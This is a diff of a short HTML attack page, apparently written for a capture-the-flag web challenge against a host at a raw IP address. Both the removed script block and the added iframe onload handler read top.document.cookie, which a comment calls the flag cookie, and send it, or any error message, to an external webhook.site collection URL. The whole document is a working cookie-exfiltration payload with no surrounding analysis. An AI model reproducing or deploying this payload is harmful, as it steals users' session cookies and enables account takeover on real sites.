@@ -1,17 +1,6 @@
 <!DOCTYPE html>
 <html>
 <body>
-<script>
-// Try to access the flag cookie from the parent/top domain
-try {
-    // If this page is loaded in an iframe from the target domain
-    if (top.location.hostname === '34.134.162.213') {
-        fetch('https://webhook.site/e49932f0-7cb4-4414-a534-2ed12d9e191f/log?c=' + top.document.cookie);
-    }
-} catch(e) {
-    // If same-origin policy blocks access
-    fetch('https://webhook.site/e49932f0-7cb4-4414-a534-2ed12d9e191f/log?error=' + e.message);
-}
-</script>
+<iframe src="http://34.134.162.213:17002/" onload="try{if(top.location.hostname==='34.134.162.213'){fetch('https://webhook.site/e49932f0-7cb4-4414-a534-2ed12d9e191f/log?c='+top.document.cookie)}}catch(e){fetch('https://webhook.site/e49932f0-7cb4-4414-a534-2ed12d9e191f/log?error='+e.message)}"></iframe>
 </body>
 </html>
